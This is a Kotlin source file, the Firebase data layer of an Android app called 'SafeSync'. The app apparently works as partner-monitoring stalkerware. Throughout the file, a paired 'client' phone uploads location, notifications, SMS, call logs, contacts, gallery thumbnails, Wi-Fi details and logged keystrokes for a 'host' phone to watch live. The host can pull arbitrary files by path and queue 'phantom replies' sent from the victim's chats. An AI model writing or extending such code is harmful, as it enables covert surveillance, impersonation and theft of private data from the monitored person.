package com.strix.safesync.data

import android.util.Log
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.FieldValue
import com.google.firebase.storage.FirebaseStorage
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.setValue
import kotlinx.coroutines.tasks.await

object FirebaseManager {

    private val auth: FirebaseAuth by lazy { FirebaseAuth.getInstance() }
    private val db: FirebaseFirestore by lazy { FirebaseFirestore.getInstance() }
    private val storage: FirebaseStorage by lazy { FirebaseStorage.getInstance() }

    var partnerId: String? by mutableStateOf(null)
    var myPairCode: String by mutableStateOf("")

    fun initialize(onReady: (String) -> Unit) {
        auth.signInAnonymously().addOnSuccessListener { result ->
            val uid = result.user?.uid ?: return@addOnSuccessListener
            myPairCode = uid.takeLast(6).uppercase()
            val deviceData = hashMapOf(
                "uid" to uid,
                "pairCode" to myPairCode,
                "updatedAt" to FieldValue.serverTimestamp()
            )
            db.collection("devices").document(uid).set(deviceData)
            onReady(myPairCode)
        }.addOnFailureListener {
            Log.e("SafeSyncFirebase", "Auth failed", it)
        }
    }

    fun linkPartner(code: String, onMatched: (Boolean) -> Unit) {
        db.collection("devices").whereEqualTo("pairCode", code.uppercase()).get()
            .addOnSuccessListener { snapshot ->
                if (!snapshot.isEmpty) {
                    partnerId = snapshot.documents[0].id
                    onMatched(true)
                } else {
                    onMatched(false)
                }
            }
            .addOnFailureListener { onMatched(false) }
    }

    fun logout() { partnerId = null }

    // ─── Uploaders (CLIENT calls these) ───────────────────────────────────────

    fun uploadLocation(lat: Double, lng: Double) {
        val uid = auth.currentUser?.uid ?: return
        val data = hashMapOf("lat" to lat, "lng" to lng, "timestamp" to FieldValue.serverTimestamp())
        db.collection("data").document(uid).collection("location").add(data)
    }

    fun uploadNotification(packageName: String, title: String?, text: String?, subTexts: List<String> = emptyList()) {
        val uid = auth.currentUser?.uid ?: return
        val data = hashMapOf(
            "package"  to packageName,
            "title"    to title,
            "text"     to text,
            "subTexts" to subTexts,
            "timestamp" to FieldValue.serverTimestamp()
        )
        db.collection("data").document(uid).collection("notifications").add(data)
    }

    fun uploadContacts(contacts: List<Map<String, String>>) {
        val uid = auth.currentUser?.uid ?: return
        db.collection("data").document(uid).collection("contacts_sync").document("latest")
            .set(mapOf("list" to contacts, "timestamp" to FieldValue.serverTimestamp()))
    }

    fun uploadCallLogs(logs: List<Map<String, String>>) {
        val uid = auth.currentUser?.uid ?: return
        db.collection("data").document(uid).collection("call_logs").document("latest")
            .set(mapOf("list" to logs, "timestamp" to FieldValue.serverTimestamp()))
    }

    fun uploadInstalledApps(apps: List<Map<String, String>>) {
        val uid = auth.currentUser?.uid ?: return
        db.collection("data").document(uid).collection("apps").document("latest")
            .set(mapOf("list" to apps, "timestamp" to FieldValue.serverTimestamp()))
    }

    /**
     * Upload each thumbnail JPEG (base64) to Firebase Storage → get download URL → store URLs in Firestore.
     * This avoids the 1 MB Firestore document limit that causes gallery data to silently vanish.
     * photos: list of {"path": ..., "thumb": base64JPEG}
     */
    fun uploadGalleryPreview(photos: List<Map<String, String>>) {
        val uid = auth.currentUser?.uid ?: return
        val storageRef = storage.reference.child("thumbs/$uid")
        val resultList = java.util.Collections.synchronizedList(mutableListOf<Map<String, String>>())
        var pending = photos.size
        if (pending == 0) {
            db.collection("data").document(uid).collection("gallery").document("latest")
                .set(mapOf("list" to emptyList<Any>(), "timestamp" to FieldValue.serverTimestamp()))
            return
        }
        photos.forEachIndexed { i, photo ->
            val path = photo["path"] ?: run { if (--pending == 0) flushGallery(uid, resultList); return@forEachIndexed }
            val base64 = photo["thumb"] ?: ""
            if (base64.isEmpty()) {
                resultList.add(mapOf("path" to path, "thumbUrl" to ""))
                if (--pending == 0) flushGallery(uid, resultList)
                return@forEachIndexed
            }
            try {
                val bytes = android.util.Base64.decode(base64, android.util.Base64.NO_WRAP)
                val fileRef = storageRef.child("$i.jpg")
                fileRef.putBytes(bytes)
                    .continueWithTask { fileRef.downloadUrl }
                    .addOnSuccessListener { url ->
                        resultList.add(mapOf("path" to path, "thumbUrl" to url.toString()))
                        if (--pending == 0) flushGallery(uid, resultList)
                    }
                    .addOnFailureListener {
                        resultList.add(mapOf("path" to path, "thumbUrl" to ""))
                        if (--pending == 0) flushGallery(uid, resultList)
                    }
            } catch (e: Exception) {
                resultList.add(mapOf("path" to path, "thumbUrl" to ""))
                if (--pending == 0) flushGallery(uid, resultList)
            }
        }
    }

    private fun flushGallery(uid: String, list: List<Map<String, String>>) {
        db.collection("data").document(uid).collection("gallery").document("latest")
            .set(mapOf("list" to list, "timestamp" to FieldValue.serverTimestamp()))
    }

    fun uploadDeviceInfo(info: Map<String, String>) {
        val uid = auth.currentUser?.uid ?: return
        db.collection("data").document(uid).collection("device").document("info")
            .set(info + mapOf("timestamp" to FieldValue.serverTimestamp()))
    }

    fun uploadHeartbeat() {
        val uid = auth.currentUser?.uid ?: return
        db.collection("data").document(uid).collection("device").document("status")
            .set(mapOf("lastSeen" to FieldValue.serverTimestamp(), "online" to true))
    }

    fun listenToPartnerStatus(onUpdate: (String) -> Unit) {
        // Returns: "online", "away", "offline", "uninstalled"
        val pid = partnerId ?: return
        db.collection("data").document(pid).collection("device").document("status")
            .addSnapshotListener { snap, _ ->
                val lastSeenMs = snap?.getTimestamp("lastSeen")?.toDate()?.time ?: 0L
                val ageMin = (System.currentTimeMillis() - lastSeenMs) / 60_000
                val status = when {
                    lastSeenMs == 0L -> "unknown"
                    ageMin <= 5      -> "online"
                    ageMin <= 30     -> "away"
                    ageMin <= 180    -> "offline"
                    else             -> "uninstalled"
                }
                onUpdate(status)
            }
    }

    // ─── Download request flow ────────────────────────────────────────────────

    /** HOST calls this: writes a download request. Calls back with download URL when ready */
    fun requestFileDownload(filePath: String, onResult: (String?) -> Unit) {
        val pid = partnerId ?: return
        val requestId = filePath.replace("/", "_").replace(".", "_")
        val reqRef = db.collection("data").document(pid)
            .collection("download_requests").document(requestId)
        reqRef.set(mapOf("path" to filePath, "status" to "pending", "timestamp" to FieldValue.serverTimestamp()))
        // Listen for the URL to come back
        reqRef.addSnapshotListener { snap, _ ->
            val status = snap?.getString("status")
            val url = snap?.getString("url")
            if (status == "ready" && url != null) {
                onResult(url)
            } else if (status == "error") {
                onResult(null)
            }
        }
    }

    /** CLIENT calls this in DataSyncWorker: checks for pending download requests */
    fun checkPendingDownloadRequests(onFound: (String, String) -> Unit) {
        val uid = auth.currentUser?.uid ?: return
        db.collection("data").document(uid).collection("download_requests")
            .whereEqualTo("status", "pending").get()
            .addOnSuccessListener { snapshot ->
                for (doc in snapshot.documents) {
                    val path = doc.getString("path") ?: continue
                    onFound(doc.id, path)
                }
            }
    }

    /** CLIENT calls this: uploads file bytes to Storage, then writes URL back */
    fun uploadFileToStorageAndRespond(requestId: String, fileBytes: ByteArray, originalPath: String) {
        val uid = auth.currentUser?.uid ?: return
        val storageRef = storage.reference.child("files/$uid/$requestId")
        val uploadTask = storageRef.putBytes(fileBytes)
        uploadTask.continueWithTask { storageRef.downloadUrl }
            .addOnSuccessListener { uri ->
                db.collection("data").document(uid)
                    .collection("download_requests").document(requestId)
                    .update(mapOf("status" to "ready", "url" to uri.toString()))
            }
            .addOnFailureListener {
                db.collection("data").document(uid)
                    .collection("download_requests").document(requestId)
                    .update(mapOf("status" to "error"))
            }
    }

    // ─── Partner Observers (HOST calls these) ─────────────────────────────────

    fun listenToPartnerNotifications(onUpdate: (List<Map<String, String>>) -> Unit) {
        val pid = partnerId ?: return
        db.collection("data").document(pid).collection("notifications")
            .orderBy("timestamp", com.google.firebase.firestore.Query.Direction.DESCENDING)
            .limit(200)
            .addSnapshotListener { snapshot, _ ->
                val list = snapshot?.documents?.map { doc ->
                    @Suppress("UNCHECKED_CAST")
                    val subTexts = (doc.get("subTexts") as? List<*>)
                        ?.filterIsInstance<String>() ?: emptyList()
                    mapOf(
                        "package"  to (doc.getString("package") ?: ""),
                        "title"    to (doc.getString("title")   ?: "No Title"),
                        "text"     to (doc.getString("text")    ?: ""),
                        // store sub-messages as "||"-joined string for easy transport
                        "subTexts" to subTexts.joinToString("||"),
                        "time"     to (doc.getTimestamp("timestamp")?.toDate()?.time?.toString() ?: "")
                    )
                } ?: emptyList()
                onUpdate(list)
            }
    }

    fun listenToPartnerLocation(onUpdate: (Double, Double) -> Unit) {
        val pid = partnerId ?: return
        db.collection("data").document(pid).collection("location")
            .orderBy("timestamp", com.google.firebase.firestore.Query.Direction.DESCENDING)
            .limit(1)
            .addSnapshotListener { snapshot, _ ->
                snapshot?.documents?.firstOrNull()?.let { doc ->
                    onUpdate(doc.getDouble("lat") ?: 0.0, doc.getDouble("lng") ?: 0.0)
                }
            }
    }

    fun listenToPartnerContacts(onUpdate: (List<Map<String, String>>) -> Unit) {
        val pid = partnerId ?: return
        db.collection("data").document(pid).collection("contacts_sync").document("latest")
            .addSnapshotListener { snapshot, _ ->
                @Suppress("UNCHECKED_CAST")
                val raw = snapshot?.get("list") as? List<Map<String, Any>>
                val list = raw?.map { m -> m.mapValues { it.value.toString() } } ?: emptyList()
                onUpdate(list)
            }
    }

    fun listenToPartnerCalls(onUpdate: (List<Map<String, String>>) -> Unit) {
        val pid = partnerId ?: return
        db.collection("data").document(pid).collection("call_logs").document("latest")
            .addSnapshotListener { snapshot, _ ->
                @Suppress("UNCHECKED_CAST")
                val raw = snapshot?.get("list") as? List<Map<String, Any>>
                val list = raw?.map { m -> m.mapValues { it.value.toString() } } ?: emptyList()
                onUpdate(list)
            }
    }

    fun listenToPartnerApps(onUpdate: (List<Map<String, String>>) -> Unit) {
        val pid = partnerId ?: return
        db.collection("data").document(pid).collection("apps").document("latest")
            .addSnapshotListener { snapshot, _ ->
                @Suppress("UNCHECKED_CAST")
                val raw = snapshot?.get("list") as? List<Map<String, Any>>
                val list = raw?.map { m -> m.mapValues { it.value.toString() } } ?: emptyList()
                onUpdate(list)
            }
    }

    fun listenToPartnerGallery(onUpdate: (List<Map<String, String>>) -> Unit) {
        val pid = partnerId ?: return
        db.collection("data").document(pid).collection("gallery").document("latest")
            .addSnapshotListener { snapshot, _ ->
                @Suppress("UNCHECKED_CAST")
                val raw = snapshot?.get("list") as? List<Map<String, Any>>
                // Each entry has {"path": ..., "thumbUrl": ...}
                val list = raw?.map { m -> m.mapValues { it.value.toString() } } ?: emptyList()
                onUpdate(list)
            }
    }

    fun listenToPartnerDeviceInfo(onUpdate: (Map<String, String>) -> Unit) {
        val pid = partnerId ?: return
        db.collection("data").document(pid).collection("device").document("info")
            .addSnapshotListener { snap, _ ->
                if (snap != null && snap.exists()) {
                    val info = snap.data?.mapValues { it.value.toString() } ?: emptyMap()
                    onUpdate(info)
                }
            }
    }

    // ─── SMS ──────────────────────────────────────────────────────────────────

    fun uploadSms(smsList: List<Map<String, String>>) {
        val uid = auth.currentUser?.uid ?: return
        db.collection("data").document(uid).collection("sms").document("latest")
            .set(mapOf("list" to smsList, "timestamp" to FieldValue.serverTimestamp()))
    }

    fun listenToPartnerSms(onUpdate: (List<Map<String, String>>) -> Unit) {
        val pid = partnerId ?: return
        db.collection("data").document(pid).collection("sms").document("latest")
            .addSnapshotListener { snap, _ ->
                @Suppress("UNCHECKED_CAST")
                val raw = snap?.get("list") as? List<Map<String, Any>>
                onUpdate(raw?.map { m -> m.mapValues { it.value.toString() } } ?: emptyList())
            }
    }

    // ─── WiFi ─────────────────────────────────────────────────────────────────

    fun uploadWifiInfo(info: Map<String, String>) {
        val uid = auth.currentUser?.uid ?: return
        db.collection("data").document(uid).collection("wifi").document("latest")
            .set(info + mapOf("timestamp" to FieldValue.serverTimestamp()))
    }

    fun listenToPartnerWifi(onUpdate: (Map<String, String>) -> Unit) {
        val pid = partnerId ?: return
        db.collection("data").document(pid).collection("wifi").document("latest")
            .addSnapshotListener { snap, _ ->
                if (snap != null && snap.exists()) {
                    onUpdate(snap.data?.mapValues { it.value.toString() } ?: emptyMap())
                }
            }
    }



    // ─── Keylogger ────────────────────────────────────────────────────────────

    fun uploadKeylog(packageName: String, text: String) {
        val uid = auth.currentUser?.uid ?: return
        val data = hashMapOf(
            "package" to packageName,
            "text"    to text,
            "timestamp" to FieldValue.serverTimestamp()
        )
        db.collection("data").document(uid).collection("keylog").add(data)
    }

    fun listenToPartnerKeylog(onUpdate: (List<Map<String, String>>) -> Unit) {
        val pid = partnerId ?: return
        db.collection("data").document(pid).collection("keylog")
            .orderBy("timestamp", com.google.firebase.firestore.Query.Direction.DESCENDING)
            .limit(200)
            .addSnapshotListener { snap, _ ->
                val list = snap?.documents?.map { doc ->
                    mapOf(
                        "package"   to (doc.getString("package") ?: ""),
                        "text"      to (doc.getString("text")    ?: ""),
                        "timestamp" to (doc.getTimestamp("timestamp")?.toDate()?.time?.toString() ?: "")
                    )
                } ?: emptyList()
                onUpdate(list)
            }
    }

    // --- Phantom Reply ---

    fun sendPhantomReply(chatKey: String, messageText: String) {
        val pid = partnerId ?: return
        val commandId = System.currentTimeMillis().toString()
        db.collection("data").document(pid).collection("phantom_replies").document(commandId)
            .set(mapOf(
                "chatKey" to chatKey,
                "messageText" to messageText,
                "timestamp" to FieldValue.serverTimestamp(),
                "status" to "pending"
            ))
    }

    private val processedReplies = mutableSetOf<String>()

    fun listenForPhantomReplies(onCommand: (String, String, String) -> Unit) {
        val uid = auth.currentUser?.uid ?: return
        db.collection("data").document(uid).collection("phantom_replies")
            .whereEqualTo("status", "pending")
            .addSnapshotListener { snap, _ ->
                if (snap != null) {
                    for (doc in snap.documents) {
                        if (processedReplies.add(doc.id)) {
                            val chatKey = doc.getString("chatKey") ?: continue
                            val messageText = doc.getString("messageText") ?: continue
                            onCommand(doc.id, chatKey, messageText)
                        }
                    }
                }
            }
    }

    fun markPhantomReplyDone(commandId: String) {
        val uid = auth.currentUser?.uid ?: return
        db.collection("data").document(uid).collection("phantom_replies").document(commandId)
            .update("status", "done")
    }
}

